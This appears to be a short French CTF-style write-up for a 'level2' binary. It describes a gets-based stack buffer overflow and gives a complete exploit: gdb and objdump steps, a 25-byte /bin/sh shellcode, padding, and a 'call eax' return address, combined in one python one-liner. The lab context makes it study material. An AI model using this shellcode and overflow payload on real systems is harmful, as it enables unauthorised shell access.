Nous avons un executalbe, nous allons donc utiliser `gdb`:

```shell
gdb ./level2
disas main
disas p
```

> En analysant p, on constate que gets est utilise, et qu'un strdup est fait a la fin. Le buffer de gets est de 76.

### Methode:

1. La premiere partie sera un shellcode (lancant le terminal): `shell-storm.org/shellcode/shellcode-827.html`
On a donc \x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x51\x53\x89\xe1\xb0\x0b\xcd\x80
(= 25 octets)

2. La deuxieme partie sera du padding (afin d'overflow notre buffer) (76 + 4 - 25 = 55 de padding) (+ 4 car EBP sur achi 32 bits)

3. La derniere partie sera l'adresse d'un jmp eax. Cela permettra d'avoir une adresse passant notre condition (que l'adresse soit differente de 0xb...).

```shell
objdump -d ./level2 | grep -E 'jump.*eax|call.*eax'
```

> Nous pouvons prendre l'adresse d'un des 2 calls eax: ex: `0x080484cf`
--> 0x080484cf devient donc /xcf/x84/x04/x08

Ainsi:

(python -c 'print "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x51\x53\x89\xe1\xb0\x0b\xcd\x80" + "A"*55 + "\xcf\x84\x04\x08"'; cat) | ./level2